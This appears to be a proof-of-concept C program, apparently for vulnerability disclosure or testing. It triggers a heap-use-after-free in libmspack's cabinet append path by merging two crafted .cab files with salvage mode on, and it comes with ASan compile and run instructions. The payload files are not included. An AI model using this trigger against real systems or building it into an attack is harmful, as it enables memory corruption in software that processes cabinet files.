// libmspack <= 0.11alpha - Heap-use-after-free
// compile: clang -fsanitize=address poc.c -I/path/to/include libmspack.a -o poc
// run:     ./poc payload1.cab payload2.cab

#include <stdio.h>
#include <mspack.h>

static unsigned count_folders(struct mscabd_folder *f) {
    unsigned n = 0;
    for (; f; f = f->next) n++;
    return n;
}

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("usage: %s payload1.cab payload2.cab\n", argv[0]);
        return 1;
    }

    struct mscab_decompressor *cabd = mspack_create_cab_decompressor(NULL);
    if (!cabd) {
        printf("[-] create decompressor failed\n");
        return 1;
    }
    cabd->set_param(cabd, MSCABD_PARAM_SALVAGE, 1);

    struct mscabd_cabinet *cab1 = cabd->open(cabd, argv[1]);
    struct mscabd_cabinet *cab2 = cabd->open(cabd, argv[2]);
    if (!cab1 || !cab2) {
        printf("[-] open failed\n");
        if (cab1) cabd->close(cabd, cab1);
        if (cab2) cabd->close(cabd, cab2);
        mspack_destroy_cab_decompressor(cabd);
        return 1;
    }

    printf("[*] Merging %u + %u folders (salvage=1)\n",
           count_folders(cab1->folders), count_folders(cab2->folders));
    printf("[*] Triggering heap-use-after-free...\n");
    fflush(stdout);

    int err = cabd->append(cabd, cab1, cab2);
    printf("[+] append returned %d\n", err);

    if (err != MSPACK_ERR_OK) cabd->close(cabd, cab2);
    cabd->close(cabd, cab1);
    mspack_destroy_cab_decompressor(cabd);
    return 0;
}